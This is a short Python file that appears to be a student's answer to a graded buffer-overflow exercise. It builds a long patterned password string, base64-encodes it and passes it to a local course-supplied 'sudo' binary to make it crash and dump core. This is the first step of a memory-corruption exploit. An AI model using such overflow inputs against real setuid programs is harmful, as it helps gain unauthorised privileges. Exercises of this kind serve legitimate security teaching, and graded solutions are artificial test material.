import os
import sys
import base64


PATH_TO_SUDO = './sudo'


def get_crash_arg() -> bytes:
    """
    This function returns the (pre-encoded) `password` argument to be sent to
    the `sudo` program.

    This data should cause the program to crash and generate a core dump. Make
    sure to return a `bytes` object and not an `str` object.

    WARNINGS:
    0. Don't delete this function or change it's name/parameters - we are going
       to test it directly in our tests, without running the main() function
       below.

    Returns:
         The bytes of the password argument.
    """
    exploit = ''.join([chr(i)*8 for i in range(65,90)]).encode('latin1')
    return exploit


def main(argv):
    # WARNING: DON'T EDIT THIS FUNCTION!
    # NOTE: os.execl() accepts `bytes` as well as `str`, so we will use `bytes`.
    os.execl(PATH_TO_SUDO, PATH_TO_SUDO, base64.b64encode(get_crash_arg()))


if __name__ == '__main__':
    main(sys.argv)
